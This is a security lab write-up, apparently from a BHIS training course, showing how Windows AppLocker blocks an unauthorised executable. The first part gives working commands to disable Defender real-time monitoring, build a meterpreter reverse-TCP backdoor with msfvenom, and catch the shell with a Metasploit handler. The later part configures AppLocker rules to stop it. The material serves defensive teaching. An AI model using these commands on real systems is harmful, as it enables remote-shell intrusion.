<h3>AppLocker</h3>

---

_NOTE: All the procedures in this lab were created and learned from: [Getting Started in Security with BHIS and MITRE ATT&CK](https://www.antisyphontraining.com/event/getting-started-in-security-with-bhis-and-mitre-attck/2023-09-18/) taught by [John Strand](https://www.sans.org/profiles/john-strand/)_

---

**Tools/Technologies used:** Windows, Linux, Powershell, cmd, Applocker, Backdoor & Backdoor listener, and Metasploit

---

_[Windows AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/applocker/what-is-applocker) is a security feature in Windows that lets administrators control which applications and scripts can run on a computer or network by creating policies based on file attributes. It enhances security by allowing only authorized and trusted software to execute, reducing the risk of malware and unauthorized applications.<br>_


Let's examine the scenario when AppLocker isn't active. Our objective is to establish a basic backdoor that connects to the Ubuntu system. It's important to note that our goal is not to demonstrate evasion of EDR or Endpoint products but rather to create a straightforward backdoor connection.

First, let's disable Defender for this session. Execute the following command from an Administrator PowerShell prompt:

```Set-MpPreference -DisableRealtimeMonitoring $true```

If you encounter any red error messages, don't worry; this indicates that Defender is not currently running.

To simplify this process, we have a couple of scripts available. Ensure that both your Windows and Linux systems are running, and let's begin by opening a Terminal as an Administrator.

![1](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/5c41c2da-866f-4ee4-9620-2b84a8acca23)
![1 5](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/bf18a584-6def-4450-ad8e-4ea2fd9e92ac)

When you get the User Account Control Prompt, select Yes.

And, open a Ubuntu command prompt:

![2](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/ef060e3f-f787-40dc-bcaa-608dabdb3894)

On your Linux system, please run the following command:

$`ifconfig`

![3](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/730a3081-5acd-4a55-94f1-3adf4aaa7975)

Please note the IP address of your Ethernet adapter.

Please note that my adaptor is called eth0 and my IP address is 172.17.32.119. Your IP Address and adapter name may be different.

Please note your IP address for the ADHD Linux system on a piece of paper:

Now, run the following commands to start a simple backdoor and backdoor listener:

$ `sudo su -` Please note, the adhd password is adhd.

`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444  -f exe -o /tmp/TrustMe.exe`

`cd /tmp`

`ls -l TrustMe.exe`

`cp ./TrustMe.exe /mnt/c/tools`

![3 1](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/a26a1b6d-945d-414e-9647-095a22f62080)

Now, let's start the Metasploit Handler. First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.

Let's become root.

`sudo su -`

root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`

![3 2](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/27d921a5-657f-4946-b602-7ee897783d06)

msf5 > `use exploit/multi/handler`

msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`

PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`

Remember, your IP will be different!

msf5 exploit(multi/handler) > `exploit`

It should look like this:

![4](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/c25b312a-6d42-4bf3-9094-e5d10d661944)

Now, let’s download the malware and run it!

First, let's open a Windows command prompt. Simply select the down carrot from the Windows Terminal and select Command Prompt.

Once the prompt is open, let's run the following commands to run the TrustMe.exe file.

`cd \tools`

Then, run it.

`.\TrustMe.exe`

Back at your Ubuntu prompt, you should have a metasploit session!

![5](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/8a6d314b-9e7e-4ed1-91e1-42f899b551a8)

Now, let’s stop this from happening!

First, let’s configure AppLocker. To do this we will need to access the Local Security Policy on your Windows System.

Simply press the Windows key (lower left hand of your keyboard, looks like a Windows Logo) then type Local Security. It should bring up a menu like the one below, please select Local Security Policy.

![6](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/a6918cd3-d8f7-4dde-9372-7f1b9190597e)

Next, we will need to configure AppLocker. To do this, please go to Security Settings > Application Control Policies and then AppLocker.

![7](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/2db93d97-4465-4eea-aacd-065ce487a71f)

In the right hand pane, you will see there are 0 Rules enforced for all policies. We will add in the default rules. We will choose the defaults because we are far less likely to brick a system.

![8](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/3ca06428-fd48-40d8-ab73-cc3807c26f3c)

Please select each of the above Rule groups (Executable, Windows Installer, Script and Packaged) and for each one, right click in the area that says “There are no items to show in this view.” and then select “Create Default Rules”

![9](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/ee9627c6-62ff-4db1-b9fe-9f595446c39d)

This should generate a subset of rules for each group. It should look similar to how it does below:

![10](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/4ed4648b-0533-4561-a69b-8ee050252334)

Next, we need to enforce the rules:

To do this you will need to select AppLocker on the far left pane. Then, you will need to select Configure rule enforcement. This will open a pop-up, you will need to check Configured for each set of rules

![11](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/009ace81-c4a7-4099-9d81-77ee996ed916)

Now, we will need to start the Application Identity service. This is done through pressing the Windows key and typing Services. This will bring up the Services App. Please select that and then double-click “Application Identity.”

![11 1](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/e6c7102a-2c60-409b-84fb-2cdc09cf5aa3)
![12](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/8005f161-ff7e-47b4-82c0-b1c23b8d4e22)

Once the Application Identity Properties dialog is open, please press the Start button. This will start the service.

![13](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/96cf5159-aa2f-467e-9137-42f8558afd63)

Next, open a command prompt and run gpupdate to force the policy change

C:\ `gpupdate /force`

![13 1](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/3e5f5109-0f64-4af6-8bfb-4db5215a01c9)

Next, log out as ADHD and log back in as allowlist.

You can do this easily by selecting the Windows icon and then the little white user icon:

![14](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/1a2599a6-b079-4226-87ea-7d322241d038)

The password is ADHD.

Now, navigate to the C:>\Tools directory with Windows Explorer and try to run some of the .exe files.

![15](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/fb6bdd70-08f6-4729-96a6-e5a5fb2e21dc)
You will see that most of the .exe files will generate an error.

You should get an error.







